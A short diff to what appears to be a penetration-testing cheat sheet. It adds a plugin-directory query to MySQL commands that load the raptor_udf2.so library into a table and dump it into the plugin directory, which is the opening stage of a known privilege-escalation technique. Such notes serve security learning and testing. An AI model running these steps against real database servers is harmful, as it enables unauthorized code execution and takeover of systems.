@@ -803,6 +803,9 @@ Transfer & Prepare:
 
 mysql > use mysql;
 mysql > SHOW VARIABLES LIKE 'datadir';             <- Locate where the plugin files are (we need it to create exploitation function)
+mysql > SHOW VARIABLES LIKE '%plugin%';            <- Plugin location
+Server version: 5.7.30 MySQL Community Server (GPL)
+
 mysql > CREATE TABLE potato(line blob);
 mysql > INSERT INTO potato VALUES(load_file('/tmp/raptor_udf2.so'));
 mysql > SELECT * FROM potato into dumpfile '/path_to_plugins_directory/raptor_udf2.so';
